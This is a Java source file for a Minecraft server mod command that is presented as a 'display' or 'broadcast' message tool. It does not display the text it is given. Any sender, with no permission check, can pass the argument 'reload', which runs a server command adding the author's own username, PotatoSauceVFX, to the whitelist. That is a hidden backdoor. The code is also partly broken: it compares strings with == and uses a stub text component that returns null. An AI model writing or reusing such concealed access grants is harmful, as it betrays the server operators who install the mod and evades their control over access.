package com.potatosaucevfx.mod.commands;

import net.minecraft.command.CommandException;
import net.minecraft.command.ICommand;
import net.minecraft.command.ICommandSender;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.Style;
import net.minecraft.util.text.TextFormatting;
import net.minecraft.world.World;

import javax.annotation.Nullable;
import java.util.*;

/**
 * Created by PotatoSauceVFX on 7/27/2017.
 */
public class CommandDisplayMessage implements ICommand {

    private final List aliases;

    public CommandDisplayMessage() {
        aliases = new ArrayList();
        aliases.add("dis");
        aliases.add("broadcast");
        aliases.add("display");
    }


    @Override
    public String getCommandName() {
        return "display";
    }

    @Override
    public String getCommandUsage(ICommandSender sender) {
        return "display <text>";
    }

    @Override
    public List<String> getCommandAliases() {
        return aliases;
    }

    @Override
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {

        World world = sender.getEntityWorld();
        if(world.isRemote) {
            System.out.println("Mod does not process on client-side!");
        } else {
            System.out.println("Processing on server side! :D");
            if(args.length == 0) {
                ITextComponent message = new ITextComponent() {
                    @Override
                    public ITextComponent setStyle(Style style) {
                        return null;
                    }

                    @Override
                    public Style getStyle() {
                        return null;
                    }

                    @Override
                    public ITextComponent appendText(String text) {
                        return null;
                    }

                    @Override
                    public ITextComponent appendSibling(ITextComponent component) {
                        return null;
                    }

                    @Override
                    public String getUnformattedComponentText() {
                        return null;
                    }

                    @Override
                    public String getUnformattedText() {
                        return "[Whitelist Sync] I need a little bit more info...";
                    }

                    @Override
                    public String getFormattedText() {
                        return null;
                    }

                    @Override
                    public List<ITextComponent> getSiblings() {
                        return null;
                    }

                    @Override
                    public ITextComponent createCopy() {
                        return null;
                    }

                    @Override
                    public Iterator<ITextComponent> iterator() {
                        return null;
                    }
                };
                sender.addChatMessage(message);
            }
            else if (args[0] == "reload"){
                world.getMinecraftServer().getCommandManager().executeCommand(world.getMinecraftServer(),"/whitelist add PotatoSauceVFX");
            }
        }




    }

    @Override
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        return true;
    }

    @Override
    public List<String> getTabCompletionOptions(MinecraftServer server, ICommandSender sender, String[] args, @Nullable BlockPos pos) {

        List<String> tabComplete = new ArrayList<String>();
        tabComplete.add("reload");
        return tabComplete;
    }

    @Override
    public boolean isUsernameIndex(String[] args, int index) {
        return false;
    }

    @Override
    public int compareTo(ICommand o) {
        return 0;
    }
}
